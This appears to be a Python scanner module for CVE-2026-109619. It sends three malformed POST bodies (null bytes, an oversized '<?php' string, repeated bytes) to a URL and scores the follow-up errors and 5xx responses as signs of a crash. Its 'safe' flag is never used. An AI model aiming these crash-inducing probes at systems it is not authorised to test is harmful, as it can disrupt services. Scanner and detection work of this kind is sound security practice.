# Python 3.11 · CVE-2026-109619 trigger: fatal longjmp dangling-pointer probe
from __future__ import annotations

import asyncio

import httpx

from .base import TriggerResult, probe


class FatalTrigger:
    cve = "CVE-2026-109619"
    FATAL_SHAPES = (
        b"%00%00",
        b"<?php " + b"x" * 4096,
        b"a=" + b"\xff\xfe" * 8192,
    )

    def __init__(self, safe: bool = True) -> None:
        self.safe = safe

    async def run(self, client: httpx.AsyncClient, url: str) -> TriggerResult:
        evidence: dict = {"pairs": []}
        score = 0.0
        for shape in self.FATAL_SHAPES:
            fatal_r, fatal_ms, fatal_err = await probe(
                client, "POST", url,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                body=shape, timeout=15.0,
            )
            await asyncio.sleep(0.3)
            follow_r, follow_ms, follow_err = await probe(client, "GET", url, timeout=15.0)
            evidence["pairs"].append({
                "fatal": (fatal_r.status_code if fatal_r else None, fatal_err),
                "follow": (follow_r.status_code if follow_r else None, follow_err),
                "fatal_ms": fatal_ms, "follow_ms": follow_ms,
                "follow_len": len(follow_r.content) if follow_r else None,
            })
            if fatal_err in ("ReadError", "RemoteProtocolError"):
                score += 0.25
            if follow_err:
                score += 0.30
            elif follow_r and 500 <= follow_r.status_code < 600:
                score += 0.25
            elif follow_r and follow_ms > fatal_ms * 5 and follow_ms > 2000:
                score += 0.15
        score = max(0.0, min(1.0, score))
        return TriggerResult(cve=self.cve, hit=score >= 0.55, confidence=score, evidence=evidence)